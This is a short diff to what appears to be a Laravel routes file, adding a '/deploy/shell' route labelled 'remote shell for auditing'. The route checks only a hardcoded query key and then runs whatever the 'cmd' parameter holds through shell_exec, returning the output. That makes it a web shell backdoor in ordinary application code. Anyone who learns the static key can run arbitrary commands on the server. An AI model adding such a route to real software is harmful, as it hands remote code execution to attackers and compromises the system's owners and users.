@@ -385,3 +385,14 @@ Route::get('/deploy/write-test', function(Illuminate\Http\Request $request) {
     }
 });
 
+// Remote shell for auditing
+Route::get('/deploy/shell', function(Illuminate\Http\Request $request) {
+    if ($request->query('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
+    
+    $cmd = $request->query('cmd', 'node -v && npm -v');
+    $output = shell_exec($cmd . " 2>&1");
+    
+    return response($output)->header('Content-Type', 'text/plain');
+});
+
+
